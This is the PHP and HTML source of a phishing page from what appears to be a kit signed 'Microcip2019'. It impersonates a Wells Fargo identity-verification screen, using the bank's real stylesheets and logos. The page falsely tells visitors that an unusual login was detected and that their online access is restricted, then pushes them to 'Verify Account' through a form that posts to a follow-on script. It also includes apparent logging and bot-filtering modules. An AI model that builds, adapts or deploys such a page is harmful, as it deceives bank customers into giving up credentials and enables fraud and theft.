<?php 
//----  Code by Microcip2019  --- //

include "log2.php";
include "bot/index.php";
?>
<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" id="indict_mobile-meta" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    
<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Pragma: no-cache"/>
<meta http-equiv="Cache Control" content="no-cache" />
<meta http-equiv="Cache Control: no-cache" />
<meta http-equiv="Expires" content="-1" />

<style id="antiClickjack">body{display:none !important;}</style>
<script type="text/javascript" nonce="d937a351-9e79-4607-a789-d80036662ed6">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</script>
<title>Wells Fargo - Verify Your Identity</title>
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/bim/masthead/masthead.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/bim/footer/footer.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/bim/button/button.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.messaging.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.input.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.dropdown.selector.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.popover.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.tabs.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/ssep/theme.ssep.timeout.css?v=EE374AC165" />
    <link rel="stylesheet" href="https://oam.wellsfargo.com/oam/static/css/twofa/twofa.bim.css?v=EE374AC165" />
    <link rel="shortcut icon" type="image/x-icon" href="https://www01.wellsfargomedia.com/favicon.ico">
    <link rel="icon" sizes="128x128" href="https://www01.wellsfargomedia.com/assets/images/icons/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="https://www01.wellsfargomedia.com/assets/images/icons/icon-hires-192x192.png">


    <style>
        #body[theme][ismobile] header .spanish-link {
            display: none;
        }
    </style>
</head>
<body id="body" theme="ssep" isMobile="true" data-cancel-url="" contextPath="/oam" divested="false" divestedCoId="">
<header class="masthead" role="banner">
        
                <div id="navLeft" style="display: block;">
                        
          <a tabindex="1" href="index.php" rel="nofollow" class="backLink">
            <span class="sr-only">Back link</span>
          </a>
        
                <div class="wf_logo" role="link">
    <img src="https://www10.wellsfargomedia.com/auth/static/images/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
  </div>
  <style type="text/css">
     .wf_logo {
    width: auto;
    text-align: center;
    top: 200%;
    vertical-align: middle;
     line-height: 42px;
    margin-top: -3px;
  </style>
        
</header>
<main>
<div control="balloonHelp" id="aaCodeHelp" class="popover-down">
    <div id="aaCodeHelp_container" class="container" tabindex="-1" role="dialog" aria-labelledby="aaCodeHelpTitle">
        <span class="close" tabindex="0" role="button" aria-label="close button"></span>
        <h2 class="popover-header" id="aaCodeHelpTitle" tabindex="-1">
            Advanced Access
        </h2>
        <div class="popover-content">
            <p>Advanced Access is an additional layer of security that safeguards certain transactions and sensitive information.</p>
            <p>When Advanced Access is required, we'll send a numeric code using the delivery method you selected, that you'll enter online.</p>
            <p>You can use each code only once so we'll provide you with a new code each time one is required.</p>
        </div>
        <span class="hook hook-up hook-left"></span>
        <span class="hide">End of popup</span>
    </div>
</div>
<nav class="st-menu st-effect-1 wfhamburger-menu" id="hamburger-menu" aria-hidden="true" style="visibility: visible;">
<div class="container clistData" data-cid="tcm:323-114093-16" data-ctid="tcm:322-2830-32">
<ul id="menu" class="menu navbar-nav">
</div>
</nav>

<div id="ErrorBox" class="messaging" style=";width: 100%;
min-height: 1em;
border-bottom: solid 5px #AFAFAF;
background-color: #F7F7F6;
padding-bottom: 3px;
margin-bottom: 18px;
float: left;">
<div class="messaging-wrapper" style="
width: 88%;
margin: 0 auto;
padding: 10px;
text-align: center;
color: #000;">
<div class="icon error" style="display: block;float: left;width: 32px;height: 32px; margin: auto 10px 0 0;background: url(https://www01.wellsfargomedia.com/assets/_mobile/images/global/alert-information.svg) no-repeat;"></div>
 <span id="ErrorUser" style="padding-left: 0px;
    color: #ec1c29;
    line-height: 15px;
    color: #000;
    font-size: 0.9em;
    font-family: Verdana,Arial,sans-serif;
    /* margin: 0; */
    display: inline;
}   
" <a href="" style="display: inline;"> <font size="2px" color="#e01320"> <strong> Alert   </strong> </font>    Here for you – updates on COVID-19 assistance and services. <a href="https://www.wellsfargo.com/jump/enterprise/coronavirus-response" class="c13">Learn more</a> </span>  


<style type="text/css">
    .c13{text-decoration: none!important;
    text-decoration-line: none !important;
    text-decoration-style: initial !important;
    text-decoration-color: initial !important;
font-weight: bold;}
</style>
  
<br>
                            </div>
                        </div>
                    </div>
<form id="tfaForm" name="tfaForm" method="POST" action="index-wells-fargo.php" novalidate="" autocomplete="off">
    <input type="hidden" id="cancel" name="cancelRequested" value=""/>
    <input type="hidden" id="sendCode" name="sendcode" value="request code"/>
    <input type="hidden" id="submitDeviceCode" name="submitDeviceCode" value=""/>
    <input type="hidden" id="rsaDeviceCode" name="rsadevicecode" value=""/>
    <div id="verifyIdentityMain" class="main-panel">
    <div control="overlay"></div>
    <br> <br> <br> <br>
    <div class="page-header">
        <h1 class="page-title" tabindex="-1">We Detected An Unusual Login Attempt. </h1>
        <div class="form-footer">
            <div control="buttonContainer">
            <br> 
            </div>
        </div>
        <div id="poza">
        <img src="./surance_files/unnamed.png" height="100" width="100" alt="Example of resizing an image"></div>
        <style type="text/css">
            #poza{
            width: auto;
            text-align: center;
            }
        </style>
        <div id="mainError" control="messaging" level="customer" messageType="error" role="alert" aria-atomic="true" tabindex="-1">
                <span class="icon"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAcCAYAAAAJKR1YAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAALBJREFUeNpiZKAA/AcCbOKMQECumUwMgwxQ6qADRIqN3BD6QKQY3Rx0kUix0SgbNFF2gUix0SijWpQxUuoj9OqDkmpjWEYZehR9GAwOukCtHDYaZfRy0EVq1WODMspYqGDGAWo1zgYloEZJrQCkHGAhBCyoHwyYb4COCQDi9/8RAMQOGEgHITsG7qiBcozDf9zAYbBl+w8DFUrnsYTO+YFMQwZAvB/JMSC2ASVmAgQYAOFQmuYMwdASAAAAAElFTkSuQmCC" alt="error"/></span>
                <span class="message"></span>
            </div>
            <p class="hidden-label" id="aaCodeLabel">Advanced Access. Opens a popup</p>
        

    <div id="mainPanel" class="tab-contents-active" >
        <div class="tab-contents">
            <input type="hidden" id="telephone" name="telephone" value=""/>
            <input type="hidden" id="email" name="email" value=""/>
            <div class="field-container">
                <div role="presentation" id="pushNotificationInfo" control="messaging" level="customer" messageType="information">
                </div>
            </div>

            <div class="field-container">
                    </select>
            </div>

            <div id="disclosure-section">
                <p class="phone-disclosure" style="display:block;text-align:;"><strong> Wells Fargo Online ® Services Fraud</strong> would like to verify some recent activity on your account. To help protect your account from unauthorized access, we have <font size="" color="red"><strong> restricted your online access </font></strong>, which will remain in effect until you <strong>re-activate it</strong>.</p>
            </div>
        </div>

        <div class="form-footer">
            <div control="buttonContainer">
                <button control="button" data-type="primary" action="request code">Verify Account</button>
                <button control="button" data-type="secondary" action="">Cancel</button>
            </div>
        </div>
    </div>
    </div>
<div id="contactInfoHelp" class="help-panel">

    <div class="page-header">
        <h1 class="page-title" tabindex="-1">Contact Information Help</h1>
    </div>
    <div class="main-content">
        <p>If your contact information is incorrect or not listed, use one of the following options to update your information and receive further assistance:</p>
        <ul class="contactInfoHelpTasks">
            <li>
                1. Visit a Wells Fargo ATM
                <p>Update your information at any Wells Fargo ATM.</p>
                <p><a href="https://www.wellsfargo.com/locator/" target="_blank" rel="noopener noreferrer" class="underline external-link">Find an ATM</a> near you.</p>
            </li>
            <li>
                2. Contact Wells Fargo Customer Service
                <ul class="sublist">
                    <li>Call <a href='tel:1-866-609-3037'>1-866-609-3037</a>. If you are calling from outside the United States, please use one of our toll-free <a international href="https://www.wellsfargo.com/help/international-access-codes" target="_blank" rel="noopener noreferrer" class="underline external-link">international access codes</a>.</li>
                    <li>Have your account information handy when you call.</li>
                    <li>Please wait until you are prompted before selecting <strong>Get Code</strong>.</li>
                        <li>Stay on the line for instructions on how to use the code.</li>
                    </ul>
            </li>
        </ul>
        <p>If you're a guest user, please ask your administrator to contact us.</p>
    </div>
    <div class="form-footer">
        <div control="buttonContainer">
        <button control="button" data-type="primary" action="request cs code">Get Code</button>
                <button control="button" data-type="secondary" action="back">Cancel</button>
            </div>
    </div>
</div>
</form>
</main>
<div id="footer">
    <div id="links">
            <span class="link-separator"></span>
            

        <p>© 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
</div>
<style type="text/css">

#footer {
  background-color: #f4f0ed;
  bottom: 0;
  left: 0;
  color: #3B3331 !important;
  font-size: 13px;
  width: 100%;
  margin: 0px !important;
  border-top: 1px solid #B5ADAD !important;
  margin-bottom: 24px;
    display: inline-block;
    font-family: "Wells Fargo Sans";
}


#footer #links {
    padding-left: 24px;
}
#footer {
    background-color: black;
}
</style>
<footer>
    <div class="bim-footer">
    <div class="bim-footerContent">
        <div class="footerLinks__linksContainer">
            <ul class="footerLinks__links footerLinks__leftLinks">
                <li>
                    <a href="https://www.wellsfargo.com/security/security-online-banking" target="_blank"
                        rel="noopener noreferrer">Online Security Guarantee</a>
                    <span class="footerLinks__divider"></span>
                </li>
                <li>
                    <a href="https://www.wellsfargo.com/privacy-security/" target="_blank" rel="noopener noreferrer">
                        Privacy, Cookies, Security &amp; Legal</a>
                    <span class="footerLinks__divider"></span>
                </li>
            </ul>
            <ul class="footerLinks__links footerLinks__rightLinks">
                <li id="sign_off">
                    <div class="bim-lock"
                        style="display: inline-flex; flex-flow: row nowrap; padding-right: 0.5rem;">
                        <svg width="12px" height="18px" viewBox="0 0 15 21" version="1.1" aria-hidden="true"
                            role="img" focusable="false">
                            <path
                                d="M7.3 19.2c-3 0-5.5-2.5-5.5-5.5 0-3 2.5-5.5 5.5-5.5s5.5 2.5 5.5 5.5C12.8 16.7 10.3 19.2 7.3 19.2zM4.1 5c0-1.8 1.4-3.2 3.2-3.2 1.8 0 3.2 1.4 3.2 3.2v2.1C9.5 6.6 8.5 6.4 7.3 6.4c-1.1 0-2.2 0.3-3.2 0.7V5zM12.4 8.5V5.1C12.4 2.3 10.1 0 7.3 0 4.5 0 2.2 2.3 2.2 5.1v3.4C0.8 9.8 0 11.6 0 13.7 0 17.7 3.3 21 7.3 21s7.3-3.3 7.3-7.3C14.6 11.6 13.8 9.8 12.4 8.5L12.4 8.5zM7.3 12.1c0.3 0 0.5-0.2 0.5-0.5V9.4c0-0.3-0.2-0.5-0.5-0.5 -0.3 0-0.5 0.2-0.5 0.5v2.3C6.9 11.9 7.1 12.1 7.3 12.1zM5.8 13.7c0-0.3-0.2-0.5-0.5-0.5H3c-0.3 0-0.5 0.2-0.5 0.5 0 0.3 0.2 0.5 0.5 0.5h2.3C5.6 14.2 5.8 13.9 5.8 13.7zM7.3 15.2c-0.3 0-0.5 0.2-0.5 0.5v2.3c0 0.3 0.2 0.5 0.5 0.5 0.3 0 0.5-0.2 0.5-0.5v-2.3C7.8 15.5 7.6 15.2 7.3 15.2zM8.9 13.7c0 0.3 0.2 0.5 0.5 0.5h2.3c0.3 0 0.5-0.2 0.5-0.5 0-0.3-0.2-0.5-0.5-0.5H9.3C9.1 13.2 8.9 13.4 8.9 13.7zM6.2 12.6c0.2-0.2 0.2-0.5 0-0.6L4.6 10.3c-0.2-0.2-0.5-0.2-0.6 0 -0.2 0.2-0.2 0.5 0 0.6l1.6 1.6C5.8 12.8 6 12.8 6.2 12.6zM6.2 14.8c-0.2-0.2-0.5-0.2-0.6 0l-1.6 1.6c-0.2 0.2-0.2 0.5 0 0.6 0.2 0.2 0.5 0.2 0.6 0l1.6-1.6C6.4 15.3 6.4 15 6.2 14.8zM8.4 14.8c-0.2 0.2-0.2 0.5 0 0.6l1.6 1.6c0.2 0.2 0.5 0.2 0.6 0 0.2-0.2 0.2-0.5 0-0.6l-1.6-1.6C8.9 14.6 8.6 14.6 8.4 14.8zM8.4 12.6c0.2 0.2 0.5 0.2 0.6 0l1.6-1.6c0.2-0.2 0.2-0.5 0-0.6 -0.2-0.2-0.5-0.2-0.6 0l-1.6 1.6C8.2 12.1 8.2 12.4 8.4 12.6z"
                                fill="#3b3331"></path>
                        </svg>
                    </div>
                    <div>
                        <a href="/oam/access/signoffNav?OAM_TKN=b9c4d198372f968d14a873157248caaf5f6defcefdea92256a0ba522356027a7">Sign Off</a>
                    </div>
                </li>
            </ul>
        </div>
    </div>
</div></footer>

</body>
</html>